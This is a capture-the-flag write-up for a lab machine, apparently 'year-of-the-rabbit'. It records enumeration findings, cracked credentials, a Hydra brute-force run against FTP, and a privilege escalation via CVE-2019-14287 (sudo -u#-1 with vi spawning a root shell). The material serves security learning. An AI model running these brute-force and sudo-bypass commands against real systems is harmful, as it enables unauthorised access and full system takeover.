## Info 
### Credential
 User     | Password    | Service | Note
----------|-------------|---------|------
ftpuser   |5iez1wGXKfPKQ| FTP     |
eli       |DSpDiM1wAEwid|         |
gwendoline|MniVCQVhQHUNI|
### Web
- `/assets`
- `/sup3r_s3cr3t_fl4g.php`
### FTP
```
$ hydra -l ftpuser -P password $ip ftp
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-07-09 16:05:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.203.10:21/
[21][ftp] host: 10.10.203.10   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-07-09 16:06:05
```

### System
- Hidden file indicate at login: `/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!`

- /etc/ppp/peers/provider, /etc/chatscripts/provider
- 127.0.0.1:631,25
- private key: /etc/ImageMagick-6/mime.xml
- /var/lib/apache2/site/enabled_by_admin/000-default
- Remote VNC file: /usr/share/mime/application/x-vnc.xml
- Wifi connection file!?
```
╔══════════╣ Searching wifi conns file
/etc/NetworkManager/system-connections/Wired connection 1
```
- group: video
- kernel version: 3.16.0-4-amd64 
- sudo version: 1.8.10p3
- DB
```
Found: /home/eli/.cache/tracker/meta.db: SQLite 3.x database
Found: /home/eli/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database
Found: /home/eli/.local/share/zeitgeist/activity.sqlite: SQLite 3.x database
Found: /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)
Found: /var/lib/colord/mapping.db: SQLite 3.x database
Found: /var/lib/colord/storage.db: SQLite 3.x database
```
- dbus: WAPSupplicant

## Path
### USer
**User `eli**
1. In `/assets/style.css`, it shows there is a page `/sup3r_s3cr3t_fl4g.php`. When goto that page, in the parameter of the redirect, it shows there is another page `/WExYY2Cv-qU`. In the page, it give us an `.png`. And at the end of the `.png` file, it give us the username of FTP and the password wordlist.
2. Crack the password and login to FTP, it give us user `eli`'s credential in Brainfuck.
**User `gwendoline`**
3. When logining as `eli`, it shows a message telling us we should find a hidden message.
```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```
4. The hidden message is at `/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!`, and the file give us `gwendoline`'s password.
### Root
1. Login as gwendoline, I found the `sudo` version is < `1.8.28`, so there might suffer the vulnerability CVE-2019-14287.
```
$ sudo --version
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```
2. Check `gwendoline`'s sudo privilege, it shows `(ALL, !root)`, so we are likely able to do CVE-2019-14287.
```
$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
``` 
3. Do CVE-2019-14287 and execute `bash` from `vi`, and, thus, gain root.
```
$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
:!bash
root@year-of-the-rabbit:/home/eli# whoami
root
```

